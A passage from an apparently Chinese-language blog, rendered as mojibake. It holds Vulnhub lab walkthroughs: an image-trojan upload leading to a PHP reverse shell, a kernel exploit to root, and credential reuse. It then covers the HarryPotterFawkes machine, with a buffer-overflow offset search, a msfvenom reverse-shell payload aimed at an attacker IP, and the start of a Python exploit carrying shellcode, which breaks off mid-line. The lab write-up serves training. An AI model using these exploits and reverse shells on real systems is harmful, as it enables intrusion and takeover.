<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201247.png" /></p>
<p>å‘ç°<code>uploaded_images</code>æˆ‘ä»¬æœ‰å…¨éƒ¨çš„æƒé™ï¼Œå› æ­¤ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå†™å…¥ä¸€å¥è¯</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201640.png" /></p>
<hr />
<p>ä¹Ÿå¯ä»¥å†™å…¥è¿™æ ·çš„å‘½ä»¤ç›´æ¥åå¼¹shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203321.png" /></p>
<p>ä¹Ÿå¯ä»¥ä¸ç”¨urlç¼–ç ï¼Œç›´æ¥asciiç ç¼–ç </p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203455.png" /></p>
<hr />
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201652.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201711.png" /></p>
<p>ä¸Šçº¿æˆåŠŸï¼</p>
<h3 id="ç¬¬ä¸‰ç§">ç¬¬ä¸‰ç§</h3>
<p>ç›´æ¥ä½¿ç”¨<code>/usr/share/webshells/php/php-reverse-shell.php</code></p>
<p>åšå¦‚ä¸‹ä¿®æ”¹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202416.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202428.png" /></p>
<p>å…ˆåœ¨kaliå¼€å¯ç›‘å¬ï¼Œç„¶å<code>load=uploaded_images/php-reverse-shell.gif</code>ç›´æ¥å‘é€æ•°æ®åŒ…</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202614.png" /></p>
<p>æˆåŠŸåå¼¹shellï¼</p>
<h2 id="æƒé™æå‡">æƒé™æå‡</h2>
<p><code>uname -a</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202705.png" /></p>
<p>å‘ç°ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬å¾ˆä½ï¼Œå¤§æ¦‚ç‡å­˜åœ¨å†…æ ¸æ¼æ´ã€‚ç›´æ¥ä½¿ç”¨ç¬¬ä¸€å‘¨çš„expå³å¯ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202847.png" /></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹æ–¹é¶æœºå­˜åœ¨<code>gcc</code>ï¼Œå³å¯ä»¥è¿›è¡Œcæ–‡ä»¶ç¼–è¯‘ã€‚æ‰€ä»¥ç›´æ¥æŠŠcæ–‡ä»¶ä¼ åˆ°é¶æœºï¼Œç¼–è¯‘æ‰§è¡Œå°±å¥½ã€‚åˆ‡è®°åˆ«ç¼–è¯‘å®Œä¼ è¿‡å»ï¼ï¼ï¼ç¼–è¯‘ç¯å¢ƒä¸åŒï¼Œå¯èƒ½å¯¼è‡´æ— æ³•åœ¨å¯¹æ–¹æœºå­ä¸Šè¿è¡Œï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203156.png" /></p>
<p>æˆåŠŸææƒåˆ°rootï¼</p>
<h1 id="æ¸—é€-2">æ¸—é€-2</h1>
<p>åˆšåˆšè·¯å¾„æ‰«æä¸­æœ‰ä¸€ä¸ª<code>c</code>æ–‡ä»¶ï¼Œç›´æ¥ç”¨<code>test.php</code>è¯»å–å…¶ä¸­çš„å†…å®¹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203553.png" /></p>
<p>å…¶ä¸­ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_connect(ip, username, password, dbname);</span><br></pre></td></tr></table></figure></p>
<p>ç›´æ¥è·å¾—äº†ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<p>è·¯å¾„æ‰«æä¸­è¿˜æ‰«æå‡ºäº†<code>/phpmy</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203828.png" /></p>
<p>ç™»å½•æˆåŠŸï¼</p>
<p>åœ¨è¡¨<code>auth</code>ä¸­æ‰¾åˆ°ç”¨æˆ·åå’Œå¯†ç ã€‚å¯ä»¥ä»index.phpçš„æºç ä¸­çœ‹åˆ°ï¼ŒsqlæŸ¥è¯¢è¯­å¥å°±æ˜¯å¸¦å…¥è¿™ä¸ªè¡¨æŸ¥è¯¢çš„ï¼Œå› æ­¤ç›´æ¥ä½¿ç”¨ä¸‹é¢çš„ç”¨æˆ·åå’Œå¯†ç å¯ä»¥ç›´æ¥ç™»å½•ï¼Œå°±ä¸ç”¨sqlæ³¨å…¥äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203922.png" /></p>
<p>ç™»å½•ä¹‹åçš„æ­¥éª¤å’Œ[[#SQLæ³¨å…¥]]]ä¹‹åçš„æ­¥éª¤ä¸€æ ·äº†ã€‚</p>
<h1 id="æ¸—é€-3">æ¸—é€-3</h1>
<h2 id="phpmysqlçš„é…ç½®ä¿¡æ¯">phpmysqlçš„é…ç½®ä¿¡æ¯</h2>
<p>é€šå¸¸ç”¨php+MySQLæ­å»ºwebåº”ç”¨çš„æ—¶å€™ä¼šç”Ÿæˆä¸€ä¸ªç½‘é¡µçš„ç®¡ç†ç³»ç»Ÿï¼Œä¸€èˆ¬æ–‡ä»¶ä¸º<code>phpmy</code>æˆ–è€…<code>phpmyadmin</code>ã€‚</p>
<p>è¿˜ä¼šç”Ÿæˆé…ç½®ä¿¡æ¯æ–‡ä»¶<code>phpmy/config.inc.php</code>æˆ–è€…<code>phpmyadmin/config.inc.php</code></p>
<h2 id="åˆ©ç”¨">åˆ©ç”¨</h2>
<p>å†æ¬¡æ‰«æï¼ˆæ¯æ¬¡æ‰«æåˆ°æ–°çš„ç›®å½•éƒ½è¦æ¥ç€å¾€ä¸‹æ‰«æï¼‰ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.15/phpmy/</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414204317.png" /></p>
<p>æ³¨æ„çº¢æ¡†çš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œç›´æ¥ç”¨<code>test.php</code>è¯»å–å…¶ä¸­çš„å†…å®¹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414204443.png" /></p>
<p>åˆå¾—åˆ°äº†ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯ç”¨æˆ·åæ˜¯<code>root</code>ï¼Œå°è¯•äº†ä¸€ä¸‹å‘ç°æ—¢ä¸æ˜¯sqlæ³¨å…¥é‚£çš„ï¼Œä¹Ÿä¸æ˜¯<code>phpmy</code>çš„ç™»å½•ä¿¡æ¯ï¼Œå¿½ç„¶æƒ³åˆ°ç«¯å£æ‰«æä¸­ï¼Œ22ç«¯å£å¼€å¯äº†sshæœåŠ¡ï¼Œæ•…å°è¯•ç›´æ¥è¿æ¥</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414204734.png" /></p>
<p>ç›´æ¥è·å¾—rootæƒé™ï¼</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¯¥é¶æœºéå¸¸å¥½ï¼ï¼ï¼æ¶‰åŠçš„æ”»å‡»æŠ€æœ¯éƒ½éå¸¸çš„å¸¸è§ï¼Œå¹¶ä¸”æ¯”è¾ƒå¸¸è§„ã€‚ä½†æ˜¯å°±æ˜¯è¿™äº›å¸¸è§„çš„æ¼æ´çš„ç»„åˆï¼Œå´æœ‰äº†å¾ˆå¥½çš„è¡¨ç°ï¼Œæ¯”å¦‚æ–‡ä»¶ä¸Šä¼ å’Œæ–‡ä»¶åŒ…å«å®ç°çš„å›¾ç‰‡ğŸã€ä»»æ„æ–‡ä»¶è¯»å–åŠ ä¸Šæºç å®¡è®¡ç»•è¿‡sqlæ³¨å…¥ã€å·²ç»å¼ºè¡Œçˆ†ç ´sqlæ³¨å…¥ç­‰ç­‰ã€‚å€¼å¾—å¤šæ¬¡å¤ä¹ ï¼</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>æºç å®¡è®¡</tag>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>å›¾ç‰‡é©¬</tag>
        <tag>ä»»æ„æ–‡ä»¶è¯»å–</tag>
      </tags>
  </entry>
  <entry>
    <title>12 Vulnhub HarryPotterFawkes Writeup</title>
    <url>/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸ºé«˜ï¼Œä¸»è¦çš„éš¾ç‚¹åœ¨äºç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„åˆ©ç”¨ä»¥åŠå †æº¢å‡ºæ¼æ´æ”»å‡»ã€‚å…¶æ¬¡åœ¨äºFTPæœåŠ¡æ”»å‡»å’Œæµé‡æŠ“åŒ…åˆ†æï¼Œè¿™ä¸¤è€…åœ¨ä¹‹å‰çš„é¶æœºä¸­ä»æ²¡é‡åˆ°è¿‡ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">1 é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">HarryPotter:Fawkes</a></li>
<li>è¿™æ˜¯ä¸€ä¸ªç³»åˆ—çš„é¶æœºï¼Œæ¼æ´éƒ½éå¸¸çš„å¥‡ç‰¹ï¼</li>
</ul>
<p>éš¾åº¦ï¼š</p>
<ul>
<li>é«˜</li>
</ul>
<p>ç›®æ ‡ï¼š</p>
<ul>
<li><p>å–å¾—2ä¸ªrootæƒé™</p></li>
<li><p>æ‹¿åˆ°3ä¸ªFlag</p></li>
</ul>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>webä¿¡æ¯æ”¶é›†</li>
<li><strong>FTPæœåŠ¡æ”»å‡»</strong></li>
<li><strong>ç¼“å†²åŒºæº¢å‡º</strong></li>
<li><strong>æ¨¡ç³Šæµ‹è¯•</strong></li>
<li>æ¼æ´åˆ©ç”¨ä»£ç ç¼–å†™</li>
<li><strong>æµé‡æŠ“åŒ…åˆ†æ</strong></li>
<li><strong>å †æº¢å‡ºæ¼æ´æ”»å‡»</strong></li>
<li>Metasploitï¼ˆMSFï¼‰</li>
<li>æ‰‹åŠ¨ä¿®å¤EXPä»£ç </li>
<li>æœ¬åœ°ææƒ</li>
</ul>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<ul>
<li><a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a></li>
<li>https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</li>
</ul>
<h1 id="æ¸—é€">2 æ¸—é€</h1>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">2.1 ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.16</span><br><span class="line">sudo nmap -p21,22,80,2222,9898 -A 10.0.2.16</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416151956.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152011.png" /></p>
<p>ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>21ç«¯å£çš„æœåŠ¡æ˜¯ftpï¼Œç‰ˆæœ¬ä¸ºvsfttpd 3.0.3ï¼Œå¯ä»¥åŒ¿åç™»å½•ï¼Œå¹¶ä¸”å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶<code>server_hogwarts</code></li>
<li>22ç«¯å£çš„æœåŠ¡æ˜¯sshï¼Œç‰ˆæœ¬æ˜¯OpenSSH 7.9ï¼Œ</li>
<li>80ç«¯å£çš„æœåŠ¡æ˜¯httpï¼Œç‰ˆæœ¬ä¸ºApache 2.4.38</li>
<li>2222ç«¯å£çš„æœåŠ¡ä¹Ÿæ˜¯sshï¼Œç‰ˆæœ¬ä¸ºOpenSSH 2.4.38</li>
<li>9898ç«¯å£çš„æœåŠ¡æœªçŸ¥ï¼Œæ‰€ä»¥éšä¾¿ç»™äº†ä¸€ä¸ªmonkeycom</li>
<li>é¶æœºçš„æ“ä½œç³»ç»Ÿä¸ºDebian</li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡">2.2 è®¿é—®httpæœåŠ¡</h2>
<p>ç›´æ¥è®¿é—®80ç«¯å£ï¼Œå‘ç°è¿™ä¸ªç½‘é¡µéå¸¸çš„åˆšè¿›ï¼Œåªæœ‰ä¸€å¼ å›¾ç‰‡ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152214.png" /></p>
<p>å› æ­¤å°è¯•è¿›è¡Œè·¯å¾„æ‰«æï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„å‘ç°</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152340.png" /></p>
<h2 id="è®¿é—®ftpæœåŠ¡">2.3 è®¿é—®ftpæœåŠ¡</h2>
<p>åœ¨httpä¸Šæ²¡æœ‰æœ‰ç”¨çš„å‘ç°ï¼Œæ¥ä¸‹æ¥ç›´æ¥åˆ©ç”¨ftpåŒ¿åç™»å½•ä¸Šå»ï¼Œå¹¶ä¸‹è½½å¯¹åº”çš„é‚£ä¸ªæ–‡ä»¶ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 10.0.2.16 21</span><br><span class="line">ç”¨æˆ·åè¾“å…¥ï¼šanonymous</span><br><span class="line">å¯†ç ä¸ºç©ºï¼Œç›´æ¥enter</span><br></pre></td></tr></table></figure></p>
<p>ç™»å½•è¿›å»ä¹‹åï¼Œåˆ©ç”¨<code>get server_hogwarts</code>ä¸‹è½½å¯¹åº”æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œæ¥ä¸‹æ¥æˆ‘æƒ³æŸ¥çœ‹ä¸€ä¸‹å…¶ä»–ç›®å½•çš„ä¸œè¥¿ï¼Œå‘ç°é™¤äº†ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶ï¼Œä¸èƒ½è¿›è¡Œä»»ä½•æ“ä½œã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153338.png" /></p>
<h2 id="ç¼“å†²åŒºæº¢å‡ºæ¼æ´">2.4 ç¼“å†²åŒºæº¢å‡ºæ¼æ´</h2>
<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼ŒhttpæœåŠ¡æ²¡ä¿¡æ¯ï¼Œsshæ²¡æœ‰ç”¨æˆ·å’Œå¯†ç ï¼Œ9898éƒ½ä¸çŸ¥é“ä»€ä¹ˆæœåŠ¡ï¼Œåªæœ‰åˆšåˆšä¸‹è½½çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ç±»å‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file server_hogwarts</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153531.png" /></p>
<p>ä¿¡æ¯ï¼š</p>
<ul>
<li>è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆelfæ˜¯Linuxçš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ï¼‰ï¼Œå¹¶ä¸”æ˜¯32ä½çš„</li>
<li>è¯´æ˜å¯¹æ–¹ç³»ç»Ÿæ˜¯èƒ½å¤Ÿè¿è¡Œ32ä½çš„è½¯ä»¶ï¼Œå³<code>x86</code>æ¶æ„</li>
</ul>
<p>é¦–å…ˆæ‰§è¡Œè¿™æ–‡ä»¶çœ‹ä¸€ä¸‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œç»“æœæ˜¯æ— äº‹å‘ç”Ÿï¼ŒæŸ¥çœ‹è¿›ç¨‹æ˜¯å¦å­˜åœ¨å¯¹åº”çš„è¿›ç¨‹ï¼Œå‘ç°ç¡®å®å­˜åœ¨</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154319.png" /></p>
<p>æŸ¥çœ‹å…¶æ‰€åœ¨çš„ç«¯å£</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154459.png" /></p>
<p>å‘ç°å¼€äº†9898ç«¯å£ï¼Œè”æƒ³åˆ°ç«¯å£æ‰«æçš„æ—¶å€™ï¼Œé¶æœºä¸Šä¹Ÿå¼€äº†9898ç«¯å£ï¼Œå› æ­¤ï¼Œé¶æœºä¸Šçš„9898ç«¯å£å¯¹åº”çš„æœåŠ¡åº”è¯¥å°±æ˜¯è¿™ä¸ªã€‚ç°åœ¨æœ¬åœ°ç”¨ncè¿æ¥ä¸Šçœ‹ä¸€ä¸‹è¯¥æœåŠ¡çš„åŠŸèƒ½ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154637.png" /></p>
<p>åŠŸèƒ½éå¸¸ç®€å•ï¼Œæˆ‘ä»¬è¾“å…¥å¯¹åº”çš„å­—ç¬¦ä¸²ï¼ŒæœåŠ¡è¿”å›å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œå°±ä¸€ä¸ªåŠŸèƒ½ç‚¹ã€‚è¿æ¥é¶æœºçš„9898ç«¯å£ï¼Œå‘ç°åŠŸèƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œæ¥ä¸‹æ¥åªèƒ½é€šè¿‡æŸ¥çœ‹è¯¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´æ¥åˆ¤æ–­é¶æœºä¸Šä¹Ÿå­˜åœ¨ç›¸åº”çš„æ¼æ´ã€‚</p>
<p>åœ¨æµ‹è¯•ä¹‹å‰ï¼Œéœ€è¦å…ˆæŠŠaslrå…³æ‰ã€‚</p>
<blockquote>
<p>è¯¥æŠ€æœ¯ç®€å•æ¥è¯´å°±æ˜¯æ¯æ¬¡å¯ç”¨ç¨‹åºçš„æ—¶å€™çš„å†…å­˜åœ°å€æ€»æ˜¯éšæœºçš„ï¼Œè¿™æ ·å­å³ä½¿å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œä¹Ÿä¼šå› ä¸ºæ¯æ¬¡å¯åŠ¨ç¨‹åºçš„åœ°å€ä¸åŒå¯¼è‡´ç¬¬ä¸€æ¬¡å‡ºç°æ¼æ´çš„åœ°å€Aå’Œç¬¬äºŒæ¬¡å‡ºç°æ¼æ´çš„åœ°å€Bä¸åŒï¼Œä½¿å¾—å³ä½¿å­˜åœ¨æ¼æ´ä¹Ÿæ— æ³•åˆ©ç”¨ã€‚</p>
</blockquote>
<p>æŸ¥çœ‹æ˜¯å¦å¼€å¯ï¼šï¼ˆ0æ˜¯ç¦ç”¨ï¼›1ï¼Œ2è¡¨ç¤ºå¼€å¯ï¼Œ2æ˜¯åœ¨1çš„åŸºç¡€ä¸Šè¿›ä¸€æ­¥æ‰“å¼€å †åœ°å€éšæœºåŒ–ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155246.png" /></p>
<p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤ç¦ç”¨ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo root <span class="comment"># éœ€è¦å…ˆåˆ‡æ¢åˆ°rootæ‰å¯ä»¥ï¼Œå¦åˆ™æƒé™ä¸å¤Ÿ</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
<p>åˆ©ç”¨å›¾å½¢åŒ–å·¥å…·edb-debuggerè¿›è¡ŒæŸ¥æ‰¾ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install edb-debugger <span class="comment"># å®‰è£…</span></span><br></pre></td></tr></table></figure></p>
<h3 id="æŸ¥æ‰¾æ¼æ´">2.4.1 æŸ¥æ‰¾æ¼æ´</h3>
<p>ç”Ÿæˆä¸€ä¸ª300ä¸ªAçš„å­—ç¬¦ä¸²ï¼Œç„¶åè¾“å…¥åˆ°å”¯ä¸€çš„åŠŸèƒ½ç‚¹ä¸­ï¼Œå‘ç°edb-debuggeræç¤ºå‡ºé”™äº†</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155927.png" /></p>
<p>è¯´æ˜è¿™é‡Œç¡®å®å­˜åœ¨æ¼æ´ï¼Œæ¥ä¸‹æ¥ç”Ÿæˆä¸é‡å¤çš„å­—ç¬¦ä¸²åˆ¤æ–­ä¸€ä¸‹æ˜¯å“ªå‡ ä¸ªAå‡ºç°åœ¨äº†EIPå¯„å­˜å™¨ä¸­ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_create -l 300</span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416160325.png" /></p>
<p>æ­¤æ—¶EIPä¸­çš„å€¼ä¸º<code>64413764</code>ï¼Œå³<code>d7Ad</code>ï¼ˆæ³¨æ„éœ€è¦åè¿‡æ¥ï¼‰ï¼Œç„¶åæŸ¥æ‰¾è¯¥å­ä¸²åœ¨åŸæ¥å­—ç¬¦ä¸²ä¸­çš„åç§»é‡ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_offset</span><br><span class="line"></span><br><span class="line">Exact match at offset 112</span><br></pre></td></tr></table></figure></p>
<p>ç”Ÿæˆå­—ç¬¦ä¸²ç¡®å®šä¸€ä¸‹ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27;*112 + &#x27;hdfs&#x27; + &#x27;C&#x27;*50)&quot;</span></span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhdfsCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416162156.png" /></p>
<p>æˆåŠŸæ‰¾åˆ°æ¼æ´æ‰€åœ¨ã€‚é‚£ä¹ˆè¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œä¸åƒä¹‹å‰ï¼Œä¸å­˜åœ¨æœ‰æ¼æ´çš„å‡½æ•°å¯ä»¥åˆ©ç”¨ã€‚é¦–å…ˆå¾—çŸ¥é“ä¸€ä¸ªåŸºç¡€çŸ¥è¯†ï¼š</p>
<blockquote>
<ol type="1">
<li>EIPå¯„å­˜å™¨é‡Œå­˜å‚¨çš„æ˜¯CPUä¸‹æ¬¡è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ï¼›</li>
<li>EBPï¼šæ ˆæŒ‡é’ˆå¯„å­˜å™¨(extendedÂ stackÂ pointer)ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„æ ˆé¡¶ã€‚</li>
<li>ESPï¼šåŸºå€æŒ‡é’ˆå¯„å­˜å™¨(extendedÂ baseÂ pointer)ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨ã€‚</li>
</ol>
</blockquote>
<p>ï¼ˆæˆ‘å¯¹æ±‡ç¼–ä¸ç†Ÿæ‚‰ï¼‰ç®€å•è¯´ä¸‹æˆ‘çš„ç†è§£ï¼šå¦‚æœå­˜åœ¨æ¼æ´çš„å‡½æ•°ï¼Œå¯ä»¥å°†EIPä¸­çš„å€¼ä¿®æ”¹ä¸ºå¯¹åº”å‡½æ•°çš„åœ°å€ï¼Œç„¶åCPUå°±ä¼šè‡ªåŠ¨æ‰§è¡Œå­˜åœ¨æ¼æ´çš„å‡½æ•°ã€‚åƒè¯¥é¶æœºï¼Œä¸å­˜åœ¨æ¼æ´å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡EIPè®©CPUæ‰§è¡ŒESPå¯„å­˜å™¨ä¸­çš„æŒ‡ä»¤ï¼Œå³<code>jmp esp</code>æŒ‡ä»¤ã€‚æˆ‘ä»¬æå‰åœ¨ESPä¸­å†™å…¥åå¼¹shellçš„æŒ‡ä»¤ï¼ˆå¯ä»¥ç”¨msfç”Ÿæˆï¼‰ã€‚</p>
<h3 id="åˆ©ç”¨æ¼æ´">2.4.2 åˆ©ç”¨æ¼æ´</h3>
<p>ä»æŸ¥æ‰¾æ¼æ´çš„è¿‡ç¨‹æ¥çœ‹ï¼ŒESPå¯„å­˜å™¨æ˜¯å¯å†™å…¥çš„ï¼Œå¹¶ä¸”ä¼šå°†EIPä¹‹åçš„å†…å®¹ï¼ˆå³hdfsä¹‹åçš„å†…å®¹ï¼‰å…¨éƒ¨å†™å…¥ESPã€‚å› æ­¤ï¼Œæˆ‘ä»¬å…ˆåˆ©ç”¨msfç”Ÿæˆåå¼¹shellçš„æŒ‡ä»¤ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f py <span class="comment"># ç”Ÿæˆpythonå¯åˆ©ç”¨çš„</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416163915.png" /></p>
<p>ç„¶åæŸ¥æ‰¾<code>jmp esp</code>æŒ‡ä»¤çš„åœ°å€ï¼Œåˆ©ç”¨<code>Plugins-&gt;Opcode Search</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164843.png" /></p>
<p>è¦æ‰¾åˆ°å¯æ‰§è¡Œæƒé™çš„è¿›ç¨‹ï¼Œç„¶å<code>ESP-&gt;EIP</code>ï¼ˆä¸ªäººç†è§£ï¼šå°†ESPæŒ‡ä»¤ä¼ ç»™EIPï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164946.png" /></p>
<p>è®°ä½åœ°å€ï¼Œå†™å…¥payloadçš„æ—¶å€™è®°å¾—åè¿‡æ¥ï¼</p>
<p>ç„¶åç¼–å†™åˆ©ç”¨è„šæœ¬ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbb\x77\x58\x1b\xb6\xda\xc6\xd9\x74\x24\xf4\x5a\x2b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xb5\x5c\xf9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x08\x86\x0a\x48\x39\x7b\xa6\xe5\xbf\xf2\xa9\x4a&quot;</span></span><br><span class="line">buf += <span 